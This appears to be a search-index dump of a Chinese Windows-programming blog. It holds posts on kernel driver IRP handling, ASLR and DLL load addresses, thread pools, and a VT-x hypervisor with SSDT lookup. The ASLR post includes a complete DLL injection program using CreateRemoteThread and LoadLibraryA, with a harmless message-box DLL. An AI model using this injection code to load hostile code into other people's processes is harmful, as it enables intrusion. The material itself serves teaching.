L&quot;[B]--&gt;Write&quot;, v7); //构建返回的数据 DbgPrint(&quot;[B]---&gt; 设置的输出缓冲区为: %ws\\r\\n&quot;, OutputBuffer); //显示返回的数据 irp-&gt;IoStatus.Status = STATUS_SUCCESS; Irp-&gt;IoStatus.Status = STATUS_SUCCESS; Irp-&gt;IoStatus.Information = v7; //Irp中的IoStatusBlock IoCompleteRequest(Irp, IO_NO_INCREMENT); //完成请求 return STATUS_UNSUCCESSFUL; &#125; &#125; break; default: break; &#125; &#125; while (FALSE); if (!IsOk) &#123; //请求码不是上面的情况 Irp-&gt;IoStatus.Status = Status; //Irp中的IoStatusBlock Irp-&gt;IoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_UNSUCCESSFUL; &#125; &#125; Irp-&gt;IoStatus.Status = STATUS_UNSUCCESSFUL; Irp-&gt;IoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125; 默认派遣例程1234567NTSTATUS PassThroughDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)&#123; Irp-&gt;IoStatus.Status = STATUS_SUCCESS; //LastError() Irp-&gt;IoStatus.Information = 0; //ReturnLength IoCompleteRequest(Irp, IO_NO_INCREMENT); //将Irp返回给Io管理器 return STATUS_SUCCESS;&#125; 驱动卸载1234567891011121314151617VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)&#123; PDEVICE_OBJECT v1; PDEVICE_OBJECT v2; v1 = DriverObject-&gt;DeviceObject; UNICODE_STRING LinkName; RtlInitUnicodeString(&amp;LinkName, L&quot;\\\\??\\\\DriverB&quot;); IoDeleteSymbolicLink(&amp;LinkName); while (v1 != NULL) &#123; //删除符号链接 v2 = v1-&gt;NextDevice; IoDeleteDevice(v1); v1 = v2; &#125;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？","slug":"为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？","date":"2024-02-04T13:17:35.000Z","updated":"2024-02-04T13:19:54.997Z","comments":true,"path":"2024/02/04/为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8ASLR%E6%9C%BA%E5%88%B6%E4%B8%8BDLL%E6%96%87%E4%BB%B6%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%BF%9B%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80%E7%9B%B8%E5%90%8C%EF%BC%9F/","excerpt":"","text":"为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？本篇文章为转载内容，单击标题进入原作者地址。若转载行为有侵权，请联系删除。 1. DLL 注入实现以下是实现 DLL注入的简要步骤： 1.1 打开 Visual Studio，并创建一个新的 DLL 项目。 1.2 在”dllmain.cpp” 添加以下的代码 12345678910111213141516171819202122232425 1 // dllmain.cpp : 定义 DLL 应用程序的入口点。 2 #include &quot;pch.h&quot; 3 4 BOOL APIENTRY DllMain( HMODULE hModule, 5 DWORD ul_reason_for_call, 6 LPVOID lpReserved 7 ) 8 &#123; 9 switch (ul_reason_for_call)10 &#123;11 case DLL_PROCESS_ATTACH:12 MessageBoxA(NULL, &quot;您的进程已被注入&quot;, &quot;注入警告&quot;, NULL);13 break;14 case DLL_THREAD_ATTACH:15 MessageBoxA(NULL, &quot;您的进程已被注入&quot;, &quot;注入警告&quot;, NULL);16 break;17 case DLL_THREAD_DETACH:18 MessageBoxA(NULL, &quot;您的进程已被注入&quot;, &quot;注入警告&quot;, NULL);19 break;20 case DLL_PROCESS_DETACH:21 MessageBoxA(NULL, &quot;您的进程已被注入&quot;, &quot;注入警告&quot;, NULL);22 break;23 &#125;24 return TRUE;25 &#125; 1.3 生成 DLL 文件，得到一个名为 “InjectDll.dll” 的 DLL文件。 1.4 运行以下代码，将 DLL文件注入到记事本进程中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 1 #include &lt;Windows.h&gt; 2 #include &lt;stdio.h&gt; 3 4 int main() 5 &#123; 6 // 获取目标进程的句柄 7 HWND hWnd = FindWindow(NULL, L&quot;无标题 - Notepad&quot;); 8 if (hWnd == NULL) &#123; 9 printf(&quot;未找到目标进程\\n&quot;);10 return 1;11 &#125;12 13 DWORD processId;14 GetWindowThreadProcessId(hWnd, &amp;processId);15 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);16 if (hProcess == NULL) &#123;17 printf(&quot;无法打开目标进程\\n&quot;);18 return 1;19 &#125;20 21 // 在目标进程中分配内存22 LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);23 if (pRemoteBuffer == NULL) &#123;24 printf(&quot;无法在目标进程中分配内存\\n&quot;);25 return 1;26 &#125;27 28 // 将DLL路径写入目标进程29 char dllPath[] = &quot;E:\\\\Test\\\\InjectDll.dll&quot;;30 if (!WriteProcessMemory(hProcess, pRemoteBuffer, dllPath, sizeof(dllPath), NULL)) &#123;31 printf(&quot;无法写入目标进程内存\\n&quot;);32 return 1;33 &#125;34 35 // 获取LoadLibrary函数的地址36 HMODULE hKernel32 = GetModuleHandle(L&quot;kernel32.dll&quot;);37 if (hKernel32 == NULL) &#123;38 printf(&quot;未找到kernel32.dll\\n&quot;);39 return 1;40 &#125;41 42 FARPROC pLoadLibrary = GetProcAddress(hKernel32, &quot;LoadLibraryA&quot;);43 if (pLoadLibrary == NULL) &#123;44 printf(&quot;未找到LoadLibrary函数\\n&quot;);45 return 1;46 &#125;47 48 // 在目标进程中调用LoadLibrary函数加载DLL49 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuffer, 0, NULL);50 if (hThread == NULL) &#123;51 printf(&quot;无法在目标进程中创建远程线程\\n&quot;);52 return 1;53 &#125;54 55 printf(&quot;DLL注入成功\\n&quot;);56 57 // 等待远程线程退出58 WaitForSingleObject(hThread, INFINITE);59 60 // 清理资源61 CloseHandle(hThread);62 VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);63 CloseHandle(hProcess);64 65 return 0;66 &#125; 总结一下 Dll 注入步骤 定位目标进程：使用Windows API函数（如FindWindow）或其他技术来获取目标进程的句柄或进程ID； 打开目标进程：使用OpenProcess函数打开目标进程，获取进程的句柄，以便后续操作； 在目标进程中分配内存：使用VirtualAllocEx函数在目标进程中分配一块内存，用于存储DLL路径或其他数据； 将DLL路径写入目标进程：使用WriteProcessMemory函数将DLL路径或其他数据写入目标进程的内存空间； 获取函数地址：获取所需函数（例如LoadLibrary）在目标进程所加载的模块中的地址，通常使用GetModuleHandle和GetProcAddress函数； 在目标进程中创建远程线程：使用CreateRemoteThread函数在目标进程中创建一个远程线程，该线程执行加载DLL的函数，并将DLL路径作为参数传递； 等待远程线程退出：使用WaitForSingleObject函数等待远程线程退出，确保注入操作完成； 清理资源：关闭句柄、释放内存等，以确保不会产生资源泄漏。 2. 为什么在ASLR机制下DLL文件在不同进程中加载的基址相同2.1. ALSRASLR（Address Space Layout Randomization）是一种用于增加系统安全性的技术，它通过随机化内存地址的分配，使攻击者更难以利用已知的内存布局漏洞进行攻击。实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用。 微软从Visual Studio 2005 SP1开始加入了&#x2F;dynamicbase链接选项使编译好的程序支持随机基址，只需要在编译程序的时候启用&#x2F;dynmicbase链接选项。（Visual Studio 2022 可以在项目属性中设置：配置属性——链接器——高级——随机基址） PE文件中IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE值为1，则说明该 PE文件支持ASLR，如下图所示。 ALSR 会随机化的地址包括： 堆地址 栈地址 PE文件加载基址 PEB和TEB地址 ALSR 机制能保证在每次系统重启后，系统DLL文件在进程中的加载基址不会是默认的地址0x10000000（EXE文件的默认加载基址是0x00400000），而是一个随机的地址。系统重启后这个加载基址会再次变化，ASLR的出现使得shellcode中的关键跳转只能在系统重启前，甚至只有程序的本次运行时才能执行，这使得exploit的难度大大增加。在ALSR开启的状态下，DLL 注入依然能实现是因为DLL文件在不同进程中加载的基址虽然经过了随机化的处理，但系统DLL文件(如system32目录下的DLL)在各个进程中通常加载地址仍然是相同的，以保证不同进程能互相调用这些系统DLL提供的 API。 2.2. Copy-On-Write其中更深层次的原因是操作系统需要支持写时复制机制（copy-on-write）。写时复制是现代操作系统的一个重要特性。操作系统使用页表（Page Table）来将进程的虚拟地址映射到物理地址。页表是一种数据结构，它存储了虚拟地址和物理地址之间的映射关系。 A 进程和 B 进程共享同一个 DLL 时，它们的虚拟地址空间中的虚拟地址会指向相同的物理内存页。这意味着它们共享同一份物理内存。当 A 进程尝试对 DLL 内存页进行写操作时，操作系统会触发写时复制，操作系统会将共享的物理内存页复制一份，创建一个新的物理页供 A 进程使用。A 进程会拥有自己的独立副本，而进程B仍然使用原始的物理内存页。 Copy-On-Write机制触发并不会影响虚拟地址空间的映射关系。因此，在Copy-On-Write机制中，虚拟地址空间中DLL的加载基址不会发生变化。进程A仍然可以通过原始的加载基址访问和调用DLL中的代码和数据。当多个进程加载同一个 DLL 文件并且它们的加载基址保持相同时，可以更好地利用 Copy-On-Write 机制。这样可以实现代码和只读数据的共享，延迟数据的复制，并提高内存利用率和性能。如果 DLL 加载地址不一致，Copy-On-Write 无法共享内存页，每个进程都需要单独复制 DLL 的只读内存，失去了内存优化的效果。 2.3. PE文件的加载机制在 PE 文件中有一个加载基址（Image Base）的字段，它指定了 DLL 文件在内存中的起始地址。操作系统在加载DLL文件时，首先会检查文件头中的标志，确定是否启用了ASLR或者是否存在重定位表。如果存在重定位表，操作系统会遍历重定位表中的每个条目。重定位表中的每个条目包含了两个关键信息： 重定位类型（Relocation Type）： 指定了需要进行的重定位操作，例如相对地址的基址绝对化。 偏移量（Offset）： 指定了在文件中的位置，即需要进行重定位的虚拟地址相对于模块基址的偏移量。 操作系统使用以下公式计算PE 文件中需要进行重定位的虚拟地址：VirtualAddress &#x3D; ImageBase + Offset（偏移量） 在相同的操作系统和相同的加载条件下，相同的DLL文件在不同进程中的重定位计算是一致的。因此，无论 ASLR 是否启用，PE 文件的加载机制决定了 DLL 文件在各个进程中的加载基址是相同的。 综合这三个角度，虽然ASLR在操作系统的进程管理中引入了加载基址的随机化，但由于Copy-On-Write和PE文件加载机制的作用，同一DLL文件在不同进程中的加载基址仍然是相同的。这有助于确保不同进程中的DLL文件内部结构保持一致，同时确保进程间的数据隔离，提高系统的整体安全性和资源使用效率。","categories":[{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"}],"tags":[]},{"title":"线程池","slug":"线程池","date":"2024-02-04T13:08:39.000Z","updated":"2024-02-04T13:09:08.493Z","comments":true,"path":"2024/02/04/线程池/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E7%BA%BF%E7%A8%8B%E6%B1%A0/","excerpt":"","text":"线程池处理大量的数据 线程池是可用于执行任务的线程的集合。这是一种管理和重用线程的方法，可以减少创建和销毁线程的开销。 在线程池中，会创建和维护固定数量的线程。当任务提交到线程池时，将分配一个可用线程来执行该任务。一旦任务完成，线程就会返回到池中，并可用于执行另一个任务。 线程池通常用于需要同时执行多个任务的应用程序。它们可以通过减少创建和销毁线程的开销，以及允许并行执行任务来提高性能。ThreadPoolExecutor类用于创建和管理线程池，submit方法用于将任务提交到池中执行。以下是如何使用ThreadPoolExecutor类创建线程池的示例： 12345678from concurrent.futures import ThreadPoolExecutor# Create a thread pool with 4 threadswith ThreadPoolExecutor(max_workers=4) as executor: # Submit a task to the pool future = executor.submit(my_function, arg1, arg2) # Wait for the task to complete and get the result result = future.result() 在本例中，使用ThreadPoolExecutor类创建了一个包含4个线程的线程池。使用submit方法将任务提交到池中，使用result方法等待任务完成并获得结果。 读写锁是一种同步机制，用于控制对共享资源的访问。读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。 条件变量是一种同步机制，用于在多个线程之间传递信号。条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类包含wait，notify和notifyall等方法，用于等待条件变为真，通知等待线程条件已经满足，以及通知所有等待线程条件已经满足。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。 状态变量是用于跟踪线程池中任务的状态的变量。在ThreadPoolExecutor类中，有几个状态变量用于跟踪线程池中任务的状态，例如activecount，completedcount和shutdown等。activecount变量用于跟踪当前正在执行的任务数，completedcount变量用于跟踪已完成的任务数，shutdown变量用于指示线程池是否已关闭。这些状态变量可以帮助你了解线程池中任务的状态，并根据需要采取适当的措施。 读写锁和条件变量是两种不同的同步机制，用于不同的目的。读写锁用于控制对共享资源的访问，以提高并发性能。条件变量用于在多个线程之间传递信号，以控制线程的执行顺序。 读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。 条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。 互斥体互斥体（Mutex）是一种同步机制，用于保护共享资源免受并发访问的影响。在线程池中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。因此，在线程池中使用互斥体是非常重要的。 123456789101112131415161718192021222324252627import concurrent.futuresimport threading# 共享变量counter = 0# 创建一个互斥体lock = threading.Lock()def worker(num): global counter &quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot; print(f&quot;Worker &#123;num&#125; starting&quot;) # 获取互斥体 with lock: # 修改共享变量 counter += 1 print(f&quot;Worker &#123;num&#125; finished&quot;)if __name__ == &#x27;__main__&#x27;: # 创建一个包含4个线程的线程池 with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor: # 向线程池中添加10个任务 for i in range(10): executor.submit(worker, i) # 打印共享变量的值 print(f&quot;Counter value: &#123;counter&#125;&quot;) 为了避免多个线程同时修改counter，我们使用了一个互斥体lock来保护它。在worker函数中，我们首先获取互斥体，然后修改共享变量counter。这样，我们就可以确保在任何给定时间只有一个线程可以访问counter，从而避免数据竞争和其他并发问题。 在计算机科学中，互斥体（Mutex）和锁（Lock）是两个常用的概念，它们都是用于保护共享资源免受并发访问的影响。在实际应用中，这两个概念有时会被混淆使用，但它们并不完全相同。 互斥体是一种同步机制，用于保护共享资源免受并发访问的影响。在多线程编程中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。在Python中，可以使用threading模块中的Lock类来实现互斥体的功能。 锁是一种更加通用的同步机制，它可以用于实现互斥体、信号量、条件变量等多种同步原语。在Python中，可以使用threading模块中的Lock类来实现锁的功能。Lock类提供了acquire和release方法，用于获取和释放锁。当一个线程获取了锁之后，其他线程就无法获取锁，直到该线程释放锁为止。因此，锁可以用来保护临界区，以确保在任何给定时间只有一个线程可以访问它们。 在实际应用中，互斥体和锁有时会被混淆使用，因为它们的功能有一定的重叠。在某些情况下，互斥体和锁可以互换使用，但在其他情况下，它们可能会有所不同。例如，在某些操作系统中，互斥体和锁的实现方式可能不同，因此它们的性能和行为也可能会有所不同。 在Python中，Lock类通常被用作互斥体的实现方式。因此，在线程池中使用Lock类来保护共享资源是非常常见的做法。 假唤醒虚假唤醒（Spurious Wakeup）是指在多线程编程中，一个线程在等待某个条件变量时，即使没有其他线程通知它，它也会被唤醒。这种情况可能会导致程序出现错误或异常行为，因为线程可能会在没有满足条件的情况下被唤醒。一般是由于在设置超时的时候发生。 在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类提供了wait、notify和notify_all等方法，用于等待条件变量、通知等待线程和通知所有等待线程。在使用Condition类时，需要注意虚假唤醒的问题。为了避免虚假唤醒，可以在wait方法中使用循环来检查条件是否满足，例如： 12345678910111213141516171819202122232425262728293031import threading# 共享变量counter = 0# 创建一个条件变量cond = threading.Condition()def worker(): global counter &quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot; print(&quot;Worker starting&quot;) # 获取条件变量 with cond: # 检查条件是否满足 while counter &lt; 10: # 等待条件变量 cond.wait() # 修改共享变量 counter += 1 print(&quot;Worker finished&quot;)if __name__ == &#x27;__main__&#x27;: # 创建一个线程 t = threading.Thread(target=worker) t.start() # 修改共享变量 with cond: counter += 1 # 通知等待线程 cond.notify() 在这个示例中，我们首先定义了一个共享变量counter，它将被多个线程同时访问和修改。然后，我们创建了一个条件变量cond，它将用于等待和通知线程。在worker函数中，我们首先获取条件变量，然后使用循环来检查条件是否满足。如果条件不满足，线程将等待条件变量。在主线程中，我们修改了共享变量counter，然后通知等待线程。在worker函数中，线程被唤醒后，会再次检查条件是否满足，如果条件满足，就会修改共享变量counter。这样，我们就可以避免虚假唤醒的问题，确保线程只有在满足条件的情况下才会被唤醒。 总之，虚假唤醒是多线程编程中常见的问题，需要特别注意。在Python中，可以使用threading模块中的Condition类来实现条件变量，并使用循环来避免虚假唤醒的问题。 在c++中，如果要解决，需要在传入timeout的同时传入一个函数指针，当二者同时满足的时候才能继续向下执行。 nginx线程池12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#pragma once#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;tchar.h&gt;using namespace std;#define ngx_thread_pool_queue_init(q) \\ (q)-&gt;first = NULL; \\ (q)-&gt;last = &amp;(q)-&gt;first//任务节点struct ngx_thread_task_t &#123; ngx_thread_task_t* next; //使用列表保存任务节点 unsigned int id; //对该任务的一个标识 void* ctx; //用户数据私有数据 void (*handler)(void* ctx); //处理私用数据的函数&#125;;typedef struct &#123; ngx_thread_task_t* first; ngx_thread_task_t** last;&#125; ngx_thread_pool_queue_t;//线程池的管理员struct ngx_thread_pool_t &#123; SRWLOCK lock; //读写锁 条件变量 ngx_thread_pool_queue_t queue; //存放任务节点的队列 内存池 int waiting; CONDITION_VARIABLE cond; //条件变量 int threads; //池中的配置的线程最大个数 int max_queue;&#125;;ngx_thread_pool_t*ngx_thread_pool_config(unsigned int threads);boolngx_thread_pool_init_worker(ngx_thread_pool_t* tp);voidngx_thread_pool_exit_worker(ngx_thread_pool_t* tp);unsigned intngx_thread_task_post(ngx_thread_pool_t* tp, ngx_thread_task_t* task); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181#include &quot;浅谈nginx线程池.h&quot;//条件变量//读写锁static ngx_thread_pool_t g_tp; //定义了一个全局静态的线程池管理员结构体static unsigned int ngx_thread_pool_task_id;static unsigned intngx_thread_pool_init(ngx_thread_pool_t* tp);static DWORD WINAPIngx_thread_pool_cycle(void* ctx);static voidngx_thread_pool_destroy(ngx_thread_pool_t* tp);static voidngx_thread_pool_exit_handler(void* ctx);ngx_thread_pool_t*ngx_thread_pool_config(unsigned int threads) //设置的线程个数&#123; unsigned int max_queue = 65536; //任务队列 if (threads &lt; 1) &#123; threads = 1; &#125; ngx_thread_pool_t* tp = &amp;g_tp; //全局静态结构体 if (tp-&gt;threads) &#123; return tp; &#125; tp-&gt;threads = threads; //设置线程池中的线程个数 tp-&gt;max_queue = max_queue; return tp;&#125;boolngx_thread_pool_init_worker(ngx_thread_pool_t* tp)&#123; //日志信息记录 if (ngx_thread_pool_init(tp) != true) &#123; return false; &#125; return true;&#125;static unsigned intngx_thread_pool_init(ngx_thread_pool_t* tp) //网络 文件读写 组件与组件IO操作&#123; int err; DWORD tid; SECURITY_ATTRIBUTES SecurityAttributes = &#123;0&#125;; bool IsOk = true; ngx_thread_pool_queue_init(&amp;(tp-&gt;queue)); //初始化队列 //创建读写锁 InitializeSRWLock(&amp;(tp-&gt;lock));//初始化读写锁 线程同步 //创建条件变量 InitializeConditionVariable(&amp;(tp-&gt;cond)); //可以在这里进行线程池中的线程属性设置 //IsOk = pthread_attr_init(&amp;attr); if (IsOk == false) &#123; return false; &#125; //为线程池创建线程 int n = 0; for (n = 0; n &lt; tp-&gt;threads; n++) &#123; //线程栈的默认大小是1M HANDLE ThreadHandle = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ngx_thread_pool_cycle, tp,0,&amp;tid); if (ThreadHandle == NULL) &#123; //线程回收 //工作队列任务节点进行销毁 return false; &#125; &#125; //(void)pthread_attr_destroy(&amp;attr); //销毁之前为线程设置属性时产生的动态内存 return true;&#125;static DWORD WINAPIngx_thread_pool_cycle(LPVOID ctx)&#123; ngx_thread_pool_t* tp = (ngx_thread_pool_t*)ctx; //线程池管理员 ngx_thread_task_t* task; for (;;) &#123; AcquireSRWLockExclusive(&amp;(tp-&gt;lock)); //获得SRW锁 独占权 tp-&gt;waiting--; //注意看看有没有初始化 while (tp-&gt;queue.first == NULL) //看看有无任务 &#123; if (SleepConditionVariableSRW(&amp;tp-&gt;cond, &amp;tp-&gt;lock, INFINITE, NULL) == false) //释放锁 Sleep 等待通知唤醒重新拿到锁的控制权 &#123; //调用上述函数失败 ReleaseSRWLockExclusive(&amp;tp-&gt;lock); return -1; &#125; &#125; //如果任务存在 task = tp-&gt;queue.first; if (task-&gt;next != NULL) &#123; tp-&gt;queue.first = task-&gt;next; //队列任务下移 &#125; if (tp-&gt;queue.first == NULL) &#123; //只有上述一个任务的时候 将Last域置空 tp-&gt;queue.last = &amp;tp-&gt;queue.first; &#125; ReleaseSRWLockExclusive(&amp;tp-&gt;lock); //处理队列中的认为 task-&gt;handler(task-&gt;ctx); //将任务插入到队列的时候都会放置处理函数 task-&gt;next = NULL; //当前任务从 任务队列中断开 //假如task是使用了动态申请 一定要主要回收 &#125;&#125;unsigned intngx_thread_task_post(ngx_thread_pool_t* tp, ngx_thread_task_t* task)&#123; AcquireSRWLockExclusive(&amp;tp-&gt;lock); //获得SRW锁 if (tp-&gt;waiting &gt;= tp-&gt;max_queue) &#123; ReleaseSRWLockExclusive(&amp;tp-&gt;lock); return false; &#125; task-&gt;id = ngx_thread_pool_task_id++; //使用全局变量为每个任务节点进行编号 task-&gt;next = NULL; WakeConditionVariable(&amp;tp-&gt;cond); //通知工作线程 *tp-&gt;queue.last = task; tp-&gt;queue.last = &amp;task-&gt;next; tp-&gt;waiting++; ReleaseSRWLockExclusive(&amp;tp-&gt;lock); return true;&#125;voidngx_thread_pool_exit_worker(ngx_thread_pool_t* tp)&#123; ngx_thread_pool_destroy(tp);&#125;static voidngx_thread_pool_destroy(ngx_thread_pool_t* tp)&#123; unsigned int n; ngx_thread_task_t task; //投递退出循环的任务 volatile unsigned int lock; //不允许从寄存器中获取该数据 ZeroMemory(&amp;task, sizeof(ngx_thread_task_t)); task.handler = ngx_thread_pool_exit_handler; //杀死当前线程 task.ctx = (void*)&amp;lock; for (n = 0; n &lt; tp-&gt;threads; n++) &#123; lock = 1; if (ngx_thread_task_post(tp, &amp;task) != true) //开一枪 死一个 &#123; return; &#125; while (lock) &#123; Sleep(0); &#125; &#125;&#125;static voidngx_thread_pool_exit_handler(void* data)&#123; _tprintf(_T(&quot;ThreadIdentify:%d ngx_thread_pool_exit_handler()\\r\\n&quot;), GetCurrentThreadId()); unsigned int* lock = (unsigned int*)data; *lock = 0; ExitThread(0);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &quot;浅谈nginx线程池.h&quot;//条件变量 读写锁//数据结构//销毁线程池//static void ngx_thread_handler(void* ctx); //只能在当前CPP文件中被调用void _tmain()&#123; ngx_thread_task_t task[2]; //处理任务 ZeroMemory(task, sizeof(ngx_thread_task_t) * 2); //内存进行初始 int ctx1 = 1; int ctx2 = 2; task[0].handler = ngx_thread_handler; //处理数据的函数 task[0].ctx = (void*)&amp;ctx1; task[1].handler = ngx_thread_handler; task[1].ctx = (void*)&amp;ctx2; //线程池初始化 必须指定线程池中的线程个数 //获取当前系统信息 SYSTEM_INFO SystemInfo = &#123; 0 &#125;; GetSystemInfo(&amp;SystemInfo); DWORD dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; //线程池进行信息配置 ngx_thread_pool_t* tp = ngx_thread_pool_config(3); //线程池的管理员 //线程池进行初始化 if (true != ngx_thread_pool_init_worker(tp)) &#123; goto done; &#125; //投递任务 if (ngx_thread_task_post(tp, &amp;task[0]) != true) &#123; return; &#125; if (ngx_thread_task_post(tp, &amp;task[1]) != true) &#123; return; &#125;done: ngx_thread_pool_exit_worker(tp); //通知工作线程解散 return;&#125;static void ngx_thread_handler(void* ctx) //任务节点的数据处理函数&#123; int v1 = *(int*)ctx; _tprintf(_T(&quot;ThreadIdentify:%d ngx_thread_handler() %d\\r\\n&quot;),GetCurrentThreadId(),v1); &#125;","categories":[{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"}],"tags":[]},{"title":"VT-x","slug":"VT-x","date":"2024-02-04T13:02:40.000Z","updated":"2024-02-04T13:02:57.606Z","comments":true,"path":"2024/02/04/VT-x/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/VT-x/","excerpt":"","text":"虚拟化目录（点击跳转） [TOC] 检查硬件虚拟化12345678BOOLEAN HvmIsHVSupported()&#123; CPU_VENDOR vendor = UtilCPUVendor();// CPU供应商 if (vendor == CPU_Intel) return VmxHardSupported(); return TRUE;&#125; UtilCPUVendor获取CPU制造商信息1234567891011121314151617181920/// &lt;summary&gt;/// Get CPU vendor/// &lt;/summary&gt;/// &lt;returns&gt;Intel or AMD. If failed - Other&lt;/returns&gt;CPU_VENDOR UtilCPUVendor()&#123; CPUID data = &#123; 0 &#125;; char vendor[0x20] = &#123; 0 &#125;; __cpuid( (int*)&amp;data, 0 );// #include &lt;intrin.h&gt; *(int*)(vendor) = data.ebx; *(int*)(vendor + 4) = data.edx; *(int*)(vendor + 8) = data.ecx; if (memcmp( vendor, &quot;GenuineIntel&quot;, 12 ) == 0) return CPU_Intel; if (memcmp( vendor, &quot;AuthenticAMD&quot;, 12 ) == 0) return CPU_AMD; return CPU_Other;&#125; VmxHardSupported检查硬件虚拟化是否支持12345678910111213141516171819202122232425262728293031/// &lt;summary&gt;/// Check if VT-x is supported/// &lt;/summary&gt;/// &lt;returns&gt;TRUE if supported&lt;/returns&gt;BOOLEAN VmxHardSupported()// 检查VT-x是否支持&#123; CPUID data = &#123; 0 &#125;; // VMX bit __cpuid( (int*)&amp;data, 1 ); if ((data.ecx &amp; (1 &lt;&lt; 5)) == 0)// 检查ecx寄存器的第5位是否为1 return FALSE;// 如果是0，说明不支持VT-x IA32_FEATURE_CONTROL_MSR Control = &#123; 0 &#125;;// 读取IA32_FEATURE_CONTROL_MSR寄存器 Control.All = __readmsr( MSR_IA32_FEATURE_CONTROL );// IA32_FEATURE_CONTROL_MSR寄存器的地址为0x3A // BIOS lock check if (Control.Fields.Lock == 0)// 检查是否锁定 &#123; Control.Fields.Lock = TRUE;// 将锁定位置1 Control.Fields.EnableVmxon = TRUE;// 将VMXON使能位置1 __writemsr( MSR_IA32_FEATURE_CONTROL, Control.All );// 写入IA32_FEATURE_CONTROL_MSR寄存器 &#125; else if (Control.Fields.EnableVmxon == FALSE)// 检查VMXON是否使能 &#123; DPRINT( &quot;HyperBone: CPU %d: %s: VMX locked off in BIOS\\n&quot;, CPU_IDX, __FUNCTION__ );// 如果没有使能，打印错误信息 return FALSE; &#125; return TRUE;&#125; UtilSSDTEntry获取系统服务描述表特定索引处函数地址12345678910111213141516171819202122/// &lt;summary&gt;/// Gets the SSDT entry address by index./// &lt;/summary&gt;/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;PVOID UtilSSDTEntry( IN ULONG index )&#123; ULONG size = 0; PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = UtilSSDTBase();// 获取SSDT表的基址 PVOID pBase = UtilKernelBase( &amp;size );// 获取内核基址 if (pSSDT &amp;&amp; pBase) &#123; // 对索引进行范围检查 if (index &gt; pSSDT-&gt;NumberOfServices)// 如果索引大于服务数量 return NULL; return (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; 4);// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐 &#125; return NULL;&#125; 获取SSDT表函数地址12345678910111213141516171819202122/// &lt;summary&gt;/// Gets the SSDT entry address by index./// &lt;/summary&gt;/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;PVOID UtilSSDTEntry( IN ULONG index )&#123; ULONG size = 0; 